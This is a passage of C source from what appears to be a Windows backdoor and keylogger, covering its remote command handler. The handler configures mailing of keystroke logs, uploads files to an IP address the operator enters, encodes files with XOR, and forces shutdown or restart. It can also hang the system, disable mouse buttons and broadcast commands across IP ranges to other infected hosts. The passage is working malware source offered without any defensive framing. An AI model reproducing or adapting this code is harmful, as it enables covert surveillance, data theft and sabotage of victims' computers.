		wsprintf(response, "]\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<WAIT DATA COMMAND>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[WAITDATA_COM_IND])) {
		int port_num;

		res = get_com_param(
				con_s,
				"Enter output file name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter port number to wait on: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		port_num = atol(param2);
		if (port_num > 0) {
			wsprintf(response, "Please wait...\r\n");
			get_file_data(param1, port_num, con_s);
		} else {
			wsprintf(response, "Error: bad port!\r\n");
		}
		SEND_RESPONSE();
		return;
	}

/*---<SEND DATA COMMAND>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SENDDATA_COM_IND])) {
		int port_num;

		res = get_com_param(
				con_s,
				"Enter file name to be sent: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter IP address of the waiting server: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter port number to send data to: ",
				param3,
				sizeof(param3),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(response, "Please wait...\r\n");
		port_num = atol(param3);
		if (port_num > 0) {
			wsprintf(response, "Please wait...\r\n");
			send_file_data(param1, param2, port_num, con_s);
		} else {
			wsprintf(response, "Error: bad port number!\r\n");
		}
		SEND_RESPONSE();
		return;
	}

/*---<SHOW CONFIG COMMAND>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SHOWCONFIG_COM_IND])) {
		int i;

		/*=Password info=*/
		wsprintf(response,"Current authorization password is:\r\n");
		SEND_RESPONSE();
		wsprintf(response,"-[%s]\r\n\r\n",prog_conf.auth_password);
		SEND_RESPONSE();
		/*=Log file size info=*/
		wsprintf(response,"Maximum key log file size is:\r\n");
		SEND_RESPONSE();
		wsprintf(response,"-[%d bytes] == [%d kilobytes]\r\n\r\n",prog_conf.keylog_send_size,prog_conf.keylog_send_size / 1024);
		SEND_RESPONSE();
		/*=Log storages info=*/
		wsprintf(response,"List of log storages:\r\n");
		SEND_RESPONSE();
		for (i = 0; i<prog_conf.nr_logstorages; i++) {
			wsprintf(response,"[%d]-[%s]\r\n",i,prog_conf.logstorages[i]);
			SEND_RESPONSE();
		}
		wsprintf(response,"--------- Total: [%d] ---------\r\n\r\n",prog_conf.nr_logstorages);
		SEND_RESPONSE();
		/*=Mail servers info=*/
		wsprintf(response,"List of mail servers:\r\n");
		SEND_RESPONSE();
		for (i = 0; i<prog_conf.nr_mailservers; i++) {
			wsprintf(response,"[%d]-[%s]\r\n",i,prog_conf.mailservers[i]);
			SEND_RESPONSE();
		}
		wsprintf(response,"--------- Total: [%d] ---------\r\n\r\n",prog_conf.nr_mailservers);
		SEND_RESPONSE();
		/* The End */
		return;
	}

/*---<CODE FILE COMMAND>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[CODEFILE_COM_IND])) {
		byte xor_key;

		res = get_com_param(
				con_s,
				"Enter file name: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter key (1 - 256): ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		xor_key = (byte)atol(param2);
		if (xor_key > 0) {
			wsprintf(response, "Coding file... ");
			SEND_RESPONSE();
			if (code_file(param1, xor_key) == OPERATION_ERROR)
				wsprintf(response, "FAILED.\r\n");
			else
				wsprintf(response, "OK.\r\n");
		} else {
			wsprintf(response, "Error: bad key!\r\n");
		}
		SEND_RESPONSE();
		return;
	}

/*---<MAKE CONFIG FILE COMMAND>---------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[MAKECONFIGFILE_COM_IND])) {
		char *cfile_path; // full path of the configuration file
		char tmp_buf[MAX_COMMAND_LENGTH];
		int i, x; // used as indexes
		char **llogstorages;
		char **lmailservers;
		int lnr_logstorages;
		int lnr_mailservers;
		int l; // length (of something...)
		int s_val; // saved value
		int logfsize; // maximal size of key log file
		int ch_passwd, ch_logfsize, ch_logstorages, ch_mailservers;


		ch_passwd = ch_logfsize = ch_logstorages = ch_mailservers = 0; // no changes by default

		/*==========================*/
		/*=Changing old password...=*/
		/*==========================*/
		res = get_com_param(
				con_s,
				"Enter old password: ",
				param1,
				MAX_PASSWD_LENGTH,
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (lstrcmp(param1, prog_conf.auth_password)!=0) {
			wsprintf(response, "Bad old password!\r\n");
			SEND_RESPONSE();
			return; // old password is a mandatory parameter!
		}
		wsprintf(response, "Old password OK.\r\n");
		SEND_RESPONSE();
		ZeroMemory(param1, sizeof(param1));
		res = get_com_param(
				con_s,
				"Enter new password: ",
				param1,
				MAX_PASSWD_LENGTH,
				FALSE
		);
		CHECK_ERROR_RETURN();
		if (param1[0] == '\0')
			wsprintf(response, "Old password not changed.\r\n");
		else {
			ch_passwd = 1; // password will be changed
			wsprintf(response, "New password OK.\r\n");
		}
		SEND_RESPONSE();

		/*=======================================*/
		/*=Changing maximal key log file size...=*/
		/*=======================================*/
		res = get_com_param(
				con_s,
				"Enter maximal size of the key log file in KB: ",
				param2,
				4,
				FALSE
		);
		CHECK_ERROR_RETURN();
		if (param2[0] == '\0')
			wsprintf(response, "Old maximal key log file size not changed.\r\n");
		else {
			logfsize = atol(param2);
			logfsize<<=10; // nr * 1024 == in kilobytes
			if (logfsize<= 0 || logfsize>=MAX_SMTP_BUF_SIZE-512) {
				logfsize = DEFAULT_KEYLOGF_SEND_SIZE; // set to default on any error
				wsprintf(response, "Bad new maximal size! Defaulting...\r\n");
			}
			ch_logfsize = 1; // it will be changed
			wsprintf(response, "Maximal size of the key log file OK.\r\n");
		}
		SEND_RESPONSE();

		/*=NOTE: From this point I must not modify "param1"!!!=*/

		/*======================*/
		/*=Changing logstorages=*/
		/*======================*/
		int logstorages_modified = 2;

		res = get_com_param(
				con_s,
				"Would you like to add/modify log file storages?[y, n]: ",
				param3,
				1,
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (lstrcmpi(param3,"y")!=0 && lstrcmpi(param3,"n")!=0) {
			wsprintf(response,"You've entered incorrect character!\r\n");
			SEND_RESPONSE();
			return;
		}
		if (lstrcmpi(param3,"n")==0) {
			wsprintf(response,"Log file storages unchanged.\r\n");
			logstorages_modified = 2; // not added and not modified
			SEND_RESPONSE();
		} else {
			ch_logstorages = 1; // log storages will changes
			wsprintf(response,"OK, you will be asked for some parameters...\r\n\r\n");
			SEND_RESPONSE();
			wsprintf(response,"Current list of log file storages is:\r\n");
			SEND_RESPONSE();
			for (i = 0; i < prog_conf.nr_logstorages; i++) {
				wsprintf(response,"%d - [%s]\r\n",i,prog_conf.logstorages[i]);
				SEND_RESPONSE();
			}
			ZeroMemory(param3,sizeof(param3));
			res = get_com_param(
					con_s,
					"What do you want to do, modify or add logstorages?[m, a]: ",
					param3,
					1,
					TRUE
			);
			CHECK_ERROR_RETURN();
			if (lstrcmpi(param3,"m")!=0 && lstrcmpi(param3,"a")!=0) {
				wsprintf(response,"You've entered incorrect character!\r\n");
				SEND_RESPONSE();
				return;
			}
			lnr_logstorages = 0;
			if (lstrcmpi(param3,"a")==0) { // adding new logstorages
				ZeroMemory(param3,sizeof(param3));
				logstorages_modified = 0;
				res = get_com_param(
						con_s,
						"How many new logstorages do you want to add?: ",
						param3,
						1,
						TRUE
				);
				CHECK_ERROR_RETURN();
				lnr_logstorages = atol(param3);
				if (lnr_logstorages<=0 || lnr_logstorages + prog_conf.nr_logstorages>MAX_LOGSTORAGES) {
					wsprintf(response,"Bad number of logstorages!\r\n");
					SEND_RESPONSE();
					return;
				}
				/*=Create an image of global logstorages in local variable=*/
				lnr_logstorages += prog_conf.nr_logstorages; // this is a new number of logstorages
				llogstorages = (char **)malloc(sizeof(char *) * lnr_logstorages);
				/*=They all must be initialized as a NULL-pointers=*/
				for (i = 0; i<lnr_logstorages; i++)
					llogstorages[i] = NULL;
				/*=Copy global logstorages...=*/
				for (i = 0; i<prog_conf.nr_logstorages; i++) {
					l = lstrlen(prog_conf.logstorages[i]) + 1; /* including NULL */
					llogstorages[i] = (char *)malloc(l);
					lstrcpyn(llogstorages[i],prog_conf.logstorages[i],l);
				}
				/*=WARNING: "i" is containing index of the first new logstorage=*/
				for (i; i<lnr_logstorages; i++) {
					ZeroMemory(param3,sizeof(param3));
					wsprintf(tmp_buf,"Enter address of logstorage number [%d]: ",i);
					res = get_com_param(
							con_s,
							tmp_buf,
							param3,
							sizeof(param3) - 8,
							TRUE
					);
					if (res==OPERATION_ERROR) {
						for (x = 0; x<lnr_logstorages; x++)
							free(llogstorages[x]);
						free(llogstorages);
						return;
					}
					l = lstrlen(param3) + 1; // NULL
					llogstorages[i] = (char *)malloc(l);
					lstrcpy(llogstorages[i],param3);
				}
				/*=WARNING: lnr_logstorages contains a number of items to freed on error=*/
			} else { // modifying logstorages
				logstorages_modified = 1;
				res = get_com_param(
						con_s,
						"How many logstorages do you want to modify?: ",
						param3,
						1,
						TRUE
				);
				CHECK_ERROR_RETURN();
				lnr_logstorages = atol(param3);
				if (lnr_logstorages<=0 || lnr_logstorages>prog_conf.nr_logstorages) {
					wsprintf(response,"Bad number of logstorages!\r\n");
					SEND_RESPONSE();
					return;
				}
				/*=Create local image of global logstorages...=*/
				s_val = lnr_logstorages; // save it
				lnr_logstorages = prog_conf.nr_logstorages;
				llogstorages = (char **)malloc(sizeof(char *) * lnr_logstorages);
				for (i = 0; i<lnr_logstorages; i++) {
					l = lstrlen(prog_conf.logstorages[i]) + 1; /* including NULL */
					llogstorages[i] = (char *)malloc(l);
					lstrcpyn(llogstorages[i],prog_conf.logstorages[i],l);
				}
				lnr_logstorages = s_val; // restore (it contains a number of logstorages to be modified)
				x = 0;
				for (i = 0; i<lnr_logstorages; i++) {
					ZeroMemory(param3,sizeof(param3));
					res = get_com_param(
							con_s,
							"Enter index of logstorage to be modified: ",
							param3,
							1,
							TRUE
					);
					x = atol(param3);
					if (res==OPERATION_ERROR || (x<0 || x>=prog_conf.nr_logstorages)) {
						for (x = 0; x<prog_conf.nr_logstorages; x++)
							free(llogstorages[x]);
						free(llogstorages);
						return;
					}
					ZeroMemory(param3,sizeof(param3));
					wsprintf(tmp_buf,"Enter new logstorage number [%d]: ",x);
					res = get_com_param(
							con_s,
							tmp_buf,
							param3,
							sizeof(param3) - 8,
							TRUE
					);
					if (res==OPERATION_ERROR) {
						for (x = 0; x<prog_conf.nr_logstorages; x++)
							free(llogstorages[x]);
						free(llogstorages);
						return;
					}
					free(llogstorages[x]); // remove old logstorage
					l = lstrlen(param3) + 1; /* including NULL */
					llogstorages[x] = (char *)malloc(l);
					lstrcpy(llogstorages[i],param3);
				}
				lnr_logstorages = prog_conf.nr_logstorages; // WARNING: for new config
			}
		}
		/*=======================*/
		/*=Changing mail servers=*/
		/*=======================*/
		int mailservers_modified = 2;

		ZeroMemory(param3,sizeof(param3));
		res = get_com_param(
				con_s,
				"Would you like to add/modify mail servers?[y, n]: ",
				param3,
				1,
				TRUE
		);
		if (res==OPERATION_ERROR) {
___cleanup_after_config_errors:
___cleanup_on_exit_config:
			/*=Fuckin' errors, now I have to free all the memory used be previous operations=*/
			if (logstorages_modified==0) {
				for (i = 0; i<lnr_logstorages; i++)
					free(llogstorages[i]);
				free(llogstorages);
			} else
				if (logstorages_modified==1) {
					for (i = 0; i<prog_conf.nr_logstorages; i++)
						free(llogstorages[i]);
					free(llogstorages);
				}
			/*=Free memory user by mailservers...=*/
			if (mailservers_modified==0) {
				for (i = 0; i<lnr_mailservers; i++)
					free(lmailservers[i]);
				free(lmailservers);
			} else
				if (mailservers_modified==1) {
					for (i = 0; i<prog_conf.nr_mailservers; i++)
						free(lmailservers[i]);
					free(lmailservers);
				}
			return;
		}
		if (lstrcmpi(param3,"y")!=0 && lstrcmpi(param3,"n")!=0) {
			wsprintf(response,"You've entered incorrect character!\r\n");
			SEND_RESPONSE();
			goto ___cleanup_after_config_errors;
		}
		if (lstrcmpi(param3,"n")==0) {
			mailservers_modified = 2; // not added and not modified
			wsprintf(response,"Mail servers unchanged.\r\n");
			SEND_RESPONSE();
		} else { // changing mail servers...
			ch_mailservers = 1; // it will changes
			wsprintf(response,"OK, you will be asked for some parameters...\r\n");
			SEND_RESPONSE();
			wsprintf(response,"Current list of mail servers is:\r\n");
			SEND_RESPONSE();
			for (i = 0; i<prog_conf.nr_mailservers; i++) {
				wsprintf(response,"%d - [%s]\r\n",i,prog_conf.mailservers[i]);
				SEND_RESPONSE();
			}
			ZeroMemory(param3,sizeof(param3));
			res = get_com_param(
					con_s,
					"What do you want to do, add of modify mail servers?[a, m]: ",
					param3,
					1,
					TRUE
			);
			if (res==OPERATION_ERROR)
				goto ___cleanup_after_config_errors;
			if (lstrcmpi(param3,"a")!=0 && lstrcmpi(param3,"m")!=0) {
				wsprintf(response,"You've entered incorrect character!\r\n");
				SEND_RESPONSE();
				goto ___cleanup_after_config_errors;
			}
			lnr_mailservers = 0;
			if (lstrcmpi(param3,"a")==0) { // adding new mailservers
				ZeroMemory(param3,sizeof(param3));
				res = get_com_param(
						con_s,
						"How many new mail servers do you want to add?: ",
						param3,
						2,
						TRUE
				);
				if (res==OPERATION_ERROR)
					goto ___cleanup_after_config_errors;
				lnr_mailservers = atol(param3);
				if (lnr_mailservers<=0 || lnr_mailservers + prog_conf.nr_mailservers>MAX_MAILSERVERS) {
					wsprintf(response,"Bad number of mail servers!\r\n");
					SEND_RESPONSE();
					goto ___cleanup_after_config_errors;
				}
				lnr_mailservers += prog_conf.nr_mailservers;
				lmailservers = (char **)malloc(sizeof(char *) * lnr_mailservers);
				for (i = 0; i<lnr_mailservers; i++)
					lmailservers[i] = NULL;
				mailservers_modified = 0; // memory was allocated, so set the flag
				/*=Creating local list of mail servers=*/
				for (i = 0; i<prog_conf.nr_mailservers; i++) {
					l = lstrlen(prog_conf.mailservers[i]) + 1;
					lmailservers[i] = (char *)malloc(l);
					lstrcpyn(lmailservers[i],prog_conf.mailservers[i],l);
				}
				/*=WARNING: "i" is containing index of the first new mailserver=*/
				for (i; i<lnr_mailservers; i++) {
					ZeroMemory(param3,sizeof(param3));
					wsprintf(tmp_buf,"Enter address of mail server number [%d]: ",i);
					res = get_com_param(
							con_s,
							tmp_buf,
							param3,
							sizeof(param3) - 8,
							TRUE
					);
					if (res==OPERATION_ERROR)
						goto ___cleanup_after_config_errors;
					l = lstrlen(param3) + 1; // including NULL
					lmailservers[i] = (char *)malloc(l);
					lstrcpy(lmailservers[i],param3);
				}
				/*=WARNING: lnr_logstorages contains a number of items to freed on error=*/
			} else { // modifying mailservers
				ZeroMemory(param3,sizeof(param3));
				res = get_com_param(
						con_s,
						"How many mail servers do you want to modify?: ",
						param3,
						2,
						TRUE
				);
				if (res==OPERATION_ERROR)
					goto ___cleanup_after_config_errors;
				lnr_mailservers = atol(param3);
				if (lnr_mailservers<=0 || lnr_mailservers>prog_conf.nr_mailservers) {
					wsprintf(response,"Bad number of mail servers!\r\n");
					SEND_RESPONSE();
					goto ___cleanup_after_config_errors;
				}
				/*=Create local image of global mailservers...=*/
				s_val = lnr_mailservers;
				lnr_mailservers = prog_conf.nr_mailservers;
				lmailservers = (char **)malloc(sizeof(char *) * lnr_mailservers);
				for (i = 0; i<lnr_mailservers; i++) {
					l = lstrlen(prog_conf.mailservers[i]) + 1; // including NULL
					lmailservers[i] = (char *)malloc(l);
					lstrcpyn(lmailservers[i],prog_conf.mailservers[i],l); // with NULL
				}
				mailservers_modified = 1; // memory was allocated, so set the flag
				lnr_mailservers = s_val;
				x = 0;
				for (i = 0; i<lnr_mailservers; i++) {
					ZeroMemory(param3,sizeof(param3));
					res = get_com_param(
							con_s,
							"Enter index of mail server to be modified: ",
							param3,
							2,
							TRUE
					);
					x = atol(param3);
					if (res==OPERATION_ERROR || (x<0 || x>=prog_conf.nr_mailservers)) {
						wsprintf(response,"Bad index!\r\n");
						SEND_RESPONSE();
						goto ___cleanup_after_config_errors;
					}
					ZeroMemory(param3,sizeof(param3));
					wsprintf(tmp_buf,"Enter new mail server number [%d]: ",x);
					res = get_com_param(
							con_s,
							tmp_buf,
							param3,
							sizeof(param3) - 8,
							TRUE
					);
					if (res==OPERATION_ERROR)
						goto ___cleanup_after_config_errors;
					free(lmailservers[x]);
					l = lstrlen(param3) + 1;
					lmailservers[x] = (char *)malloc(l);
					lstrcpy(lmailservers[x],param3);
				}
				lnr_mailservers = prog_conf.nr_mailservers; // WARNING: for new config
			} // end of modifying mail servers
		} // end of changing mail servers

		/*==============*/
		/*=Setup itself=*/
		/*==============*/
		int nr_errors;

		nr_errors = 0;
___last_config_chance:
		if (nr_errors==3) {
			wsprintf(response,"You are stupid user's butt, stop fuckin' me!!!\r\n");
			SEND_RESPONSE();
			nr_errors = 0;
		}
		ZeroMemory(param3,sizeof(param3));
		wsprintf(response,"\r\nNow I'll print you all the changes you want to make:\r\n");
		SEND_RESPONSE();
		wsprintf(response,"Change password: [%s]\r\n",ch_passwd?"YES":"NO");
		SEND_RESPONSE();
		wsprintf(response,"Change log file size: [%s]\r\n",ch_logfsize?"YES":"NO");
		SEND_RESPONSE();
		wsprintf(response,"Change log storages: [%s]\r\n",ch_logstorages?"YES":"NO");
		SEND_RESPONSE();
		wsprintf(response,"Change mail servers: [%s]\r\n",ch_mailservers?"YES":"NO");
		SEND_RESPONSE();
		wsprintf(tmp_buf,"\r\nYou have last chance to discard all changes!\r\nDiscard?[y, n]: ");
		res = get_com_param(
				con_s,
				tmp_buf,
				param3,
				1,
				TRUE
		);
		if (res==OPERATION_ERROR)
			goto ___cleanup_after_config_errors;
		if (lstrcmpi(param3,"y")!=0 && lstrcmpi(param3,"n")!=0) {
			wsprintf(response,"You've entered incorrect character!\r\n");
			SEND_RESPONSE();
			nr_errors++;
			goto ___last_config_chance;
		}
		if (lstrcmpi(param3,"y")==0) {
			wsprintf(response,"No changes was made to configuration file.\r\n");
			SEND_RESPONSE();
			goto ___cleanup_after_config_errors;
		} else { // making changes to the config file
			/*=PASSWORD=*/
			if (!ch_passwd)
				lstrcpyn(param1,prog_conf.auth_password,lstrlen(prog_conf.auth_password) + 1); // with NULL
			/*=LOG FILE SIZE=*/
			if (!ch_logfsize)
				memcpy(&logfsize,&prog_conf.keylog_send_size,sizeof(int));
			/*=THE REST=*/
			write_config_file(param1,logfsize,
				ch_logstorages?lnr_logstorages:prog_conf.nr_logstorages,
				ch_mailservers?lnr_mailservers:prog_conf.nr_mailservers,
				ch_logstorages?llogstorages:prog_conf.logstorages,
				ch_mailservers?lmailservers:prog_conf.mailservers);
			/*=Intimate that all the configuration changes was made=*/
			wsprintf(response,"All the changes to configuration file was made.\r\n");
			SEND_RESPONSE();
		}
		goto ___cleanup_on_exit_config;
	}

/*---<LOAD CONFIG FILE COMMAND>---------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[LOADCONFIGFILE_COM_IND])) {
		wsprintf(response, "Loading configuration file... ");
		SEND_RESPONSE();

		read_config_file();

		wsprintf(response, "DONE.\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<LOAD DEFAULT CONF COMMAND>--------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[LOADDEFAULTCONF_COM_IND])) {
		wsprintf(response, "Loading default configuration... ");
		SEND_RESPONSE();

		set_default_config();

		wsprintf(response, "OK.\r\n");
		SEND_RESPONSE();
		return;
	}

/*---<ENUM WIN COMMAND>-----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[ENUMWIN_COM_IND])) {
		wsprintf(response, "Opened windows are:\r\n");
		SEND_RESPONSE();

		enum_windows(con_s);

		wsprintf(response, "End of opened windows.\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<SYSPOWEROFF COMMAND>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SYSPOWEROFF_COM_IND])) {
		/*
		 * This function will be generic and works on both types of systems
		 * i.e. on Windows NT and Windows 95/98
		 */
		get_winnt_shutdown_privileges();
		wsprintf(response, "\r\nShuting down the system...\r\n");
		SEND_RESPONSE();
		if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, (DWORD)0x00000000L)) {
			wsprintf(response, "\r\nUnable to shutdown the system!\r\n");
			SEND_RESPONSE();
		}

		return;
	}

/*---<SYSRESTARTCOMMAND>----------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SYSRESTART_COM_IND])) {
		/*
		 * This function will be generic and works on both types of systems
		 * i.e. on Windows NT and Windows 95/98
		 */
		get_winnt_shutdown_privileges(); /* get shutdown privilege level on win NT... */
		wsprintf(response, "\r\nRestarting the system...\r\n");
		SEND_RESPONSE();
		if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE, (DWORD)0x00000000L)) {
			wsprintf(response, "\r\nUnable to restart the system!\r\n");
			SEND_RESPONSE();
		}

		return;
	}

/*---<MCLICKSPEED COMMAND>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[MCLICKSPEED_COM_IND])) {
		UINT click_time;

		res = get_com_param(
				con_s,
				"Enter double-click time in ms: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		click_time = atol(param1);
		if (SystemParametersInfo(SPI_SETDOUBLECLICKTIME, click_time, NULL, SPIF_UPDATEINIFILE))
			wsprintf(response, "Mouse double-click speed was set.\r\n");
		else
			wsprintf(response, "Unable to set mouse double-click speed!\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<KILLMOUSEBTN COMMAND>-------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[KILLMOUSEBTN_COM_IND])) {
		if (
			SystemParametersInfo(SPI_SETDOUBLECLKHEIGHT, 0, NULL, SPIF_UPDATEINIFILE) &&
			SystemParametersInfo(SPI_SETDOUBLECLKWIDTH, 0, NULL, SPIF_UPDATEINIFILE)
		)
			wsprintf(response, "Mouse buttons killed!\r\n");
		else
			wsprintf(response, "Unable to kill mouse buttons!\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<REVIVEMOUSEBTN COMMAND>-----------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[REVIVEMOUSEBTN_COM_IND])) {
		if (
			SystemParametersInfo(SPI_SETDOUBLECLKHEIGHT, 100, NULL, SPIF_UPDATEINIFILE) &&
			SystemParametersInfo(SPI_SETDOUBLECLKWIDTH, 100, NULL, SPIF_UPDATEINIFILE)
		)
			wsprintf(response, "Mouse buttons revived.\r\n");
		else
			wsprintf(response, "Unable to revive mouse buttons!\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<CHANGEWALLPAPER COMMAND>----------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[CHANGEWALLPAPER_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter a name of the bitmap file: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		if (SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, param1, SPIF_UPDATEINIFILE))
			wsprintf(response, "Desktop wallpaper was changed.\r\n");
		else
			wsprintf(response, "Unable to change desktop wallpaper!\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<MONITORCONFIG COMMAND>------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[MONITORCONFIG_COM_IND])) {
		DEVMODE dev_mode;
		DWORD bits_per_pix;
		LONG o_r;

		dev_mode.dmSize = sizeof(DEVMODE);
		dev_mode.dmFields = DM_BITSPERPEL;
		if (EnumDisplaySettings(NULL, 0, &dev_mode)) {
			res = get_com_param(
					con_s,
					"Enter number of bits per pixel: ",
					param1,
					2,
					TRUE
			);
			CHECK_ERROR_RETURN();
			bits_per_pix = atol(param1);
			if (bits_per_pix < 1 || bits_per_pix > 32) {
				wsprintf(response, "Error: invalid number of bits!\r\n");
				SEND_RESPONSE();
				return;
			}
			dev_mode.dmBitsPerPel = bits_per_pix;
			dev_mode.dmSize = sizeof(DEVMODE);
			dev_mode.dmFields = DM_BITSPERPEL;
			o_r = ChangeDisplaySettings(&dev_mode, CDS_UPDATEREGISTRY);
			switch (o_r) {
				case DISP_CHANGE_SUCCESSFUL:
					wsprintf(response, "Monitor configuration was changed.\r\n");
					break;
				case DISP_CHANGE_RESTART:
					wsprintf(response, "Computer must be restarted.\r\n");
					break;
				default:
					wsprintf(response, "Unable to configure a monitor!\r\n");
					break;
			}
		} else {
			wsprintf(response, "Unable to configure a monitor!\r\n");
		}
		SEND_RESPONSE();

		return;
	}

/*---<HANG SYSTEM COMMAND>--------------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[HANGSYSTEM_COM_IND])) {
		wsprintf(response, "\r\nKilling the system...\r\n");
		SEND_RESPONSE();
		SleepEx(5000, FALSE);
		hang_system();

		return;
	}

/*---<SEND_SYNC_COMMAND COMMAND>--------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[SENDSYNCCOM_COM_IND])) {
		unsigned long delay_in_minutes;

		res = get_com_param(
				con_s,
				"Begining IP address: ",
				param1,
				15,
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Ending IP address: ",
				param2,
				15,
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter your IP address: ",
				param3,
				15,
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter delay in minutes (default = 0): ",
				param4,
				2,
				FALSE
		);
		CHECK_ERROR_RETURN();
		if (param4[0] == '\0')
			delay_in_minutes = 0;
		else
			delay_in_minutes = atol(param4);
		
		ZeroMemory(param4, sizeof(param4));
		res = get_com_param(
				con_s,
				"Enter synchronous command: ",
				param4,
				sizeof(param4),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(response, "Sending synchronous command...");
		SEND_RESPONSE();
		SleepEx(500, FALSE);
		send_sync_command(param1, param2, param3, param4, delay_in_minutes);
		wsprintf(response, " DONE.\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<CONFIG SYNC MSG COMMAND>----------------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[CONFIGSYNCMSG_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter synchronous message text: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		res = get_com_param(
				con_s,
				"Enter synchronous message title: ",
				param2,
				sizeof(param2),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(
				response,
				"Available message type numbers are:\r\n"
				" [%d] - (MB_OK+MB_ICONERROR)\r\n"
				" [%d] - (MB_OK+MB_ICONWARNING)\r\n"
				" [%d] - (MB_OK+MB_ICONINFORMATION)\r\n"
				" [%d] - (MB_YESNO+MB_ICONQUESTION)\r\n"
				" [%d] - (MB_ABORTRETRYIGNORE+MB_ICONSTOP)\r\n",
				MB_OK | MB_ICONERROR,
				MB_OK | MB_ICONWARNING,
				MB_OK | MB_ICONINFORMATION,
				MB_YESNO | MB_ICONQUESTION,
				MB_ABORTRETRYIGNORE | MB_ICONSTOP
		);
		SEND_RESPONSE();
		res = get_com_param(
				con_s,
				"Enter number of message type: ",
				param3,
				sizeof(SYNC_MESSAGE_TYPE),
				TRUE
		);
		CHECK_ERROR_RETURN();
		
		wsprintf(response, "Setting new synchronous message parameters...");
		SEND_RESPONSE();
		wsprintf(SYNC_MESSAGE_TEXT, "%s\r\n", param1);
		wsprintf(SYNC_MESSAGE_TITLE, "%s\r\n", param2);
		wsprintf(SYNC_MESSAGE_TYPE, "%s\r\n", param3);
		wsprintf(response, " OK.\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<CONFIG SYNC WALLPAPER COMMAND>----------------------------*/
	if (!lstrcmp(com,PROG_COMMANDS[CONFIGSYNCWALLP_COM_IND])) {
		res = get_com_param(
				con_s,
				"Enter file name of bitmap file: ",
				param1,
				sizeof(param1),
				TRUE
		);
		CHECK_ERROR_RETURN();
		wsprintf(response, "Changing synchrounous bitmap file's name...");
		SEND_RESPONSE();
		wsprintf(SYNC_CHANGEWALLPAPER_FILENAME, param1);
		wsprintf(response, " OK.\r\n");
		SEND_RESPONSE();

		return;
	}

/*=== ATTACH CONFIG COMMAND ====================================*/
	if (!lstrcmp(com,PROG_COMMANDS[ATTACHCONFIG_COM_IND])) {
		wsprintf(response,"Attaching configuration file...\r\n");
		SEND_RESPONSE();
		attach_config_file();

		return;
	}

/*=== EXTRACT CONFIG COMMAND ===================================*/
	if (!lstrcmp(com,PROG_COMMANDS[EXTRACTCONFIG_COM_IND])) {
		wsprintf(response,"Extracting configuration file... ");
		SEND_RESPONSE();
		extract_config_file();
		wsprintf(response,"DONE.\r\n");
		SEND_RESPONSE();

		return;
	}

/*---<BAD COMMAND>----------------------------------------------*/

	/* If I am here, so bad command was entered, tell it... */
	wsprintf(response, "Bad command [%s], use <help> for more information!\r\n", com);
	SEND_RESPONSE();
}
/*-----------------------------------------<EXECUTE_COMMAND>---*/

/*
 *	get_com_param() - answers the client for command parameters.
 *
 *	returns: OPERATION_ERROR - error, OPERATION_SUCCESS - success.
 */
int get_com_param(
				  int con_s, /* connected socket */
				  char *question, /* question for client */
				  char *response, /* where to store the response */
				  int resp_length, /* maximum length of client's response */
				  BOOL r_mandatory /* is this response mandatory ? */
				  ) 
{
	int res;

	if (send(con_s, question, lstrlen(question), 0) == SOCKET_ERROR)
		return (OPERATION_ERROR);
	res = get_s_data(con_s, response, resp_length);
	if ((res == OPERATION_ERROR) || ((r_mandatory) ? (!res) : (res == OPERATION_ERROR)))
